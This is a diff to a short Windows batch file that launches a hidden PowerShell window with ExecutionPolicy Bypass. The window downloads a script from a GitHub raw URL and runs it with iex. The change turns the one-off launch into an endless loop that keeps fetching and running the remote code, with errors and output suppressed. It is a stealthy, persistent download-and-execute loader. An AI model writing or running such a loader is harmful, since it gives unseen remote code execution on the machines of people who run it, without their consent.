@@ -1,10 +1,10 @@
 @echo off
 setlocal
 
-:: === ULTRA STEALTH MODE - NO WINDOW EVER ===
 set "url=https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/file.ps1"
 
+:: Launch persistent hidden PowerShell (this version works better)
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
-"Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"iex (iwr ''%url%'' -UseBasicParsing).Content\"' -PassThru" >nul 2>&1
+"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"while($true){try{iex (iwr ''%url%'' -UseBasicParsing).Content}catch{}}'\"' -WindowStyle Hidden -PassThru" >nul 2>&1
 
 exit
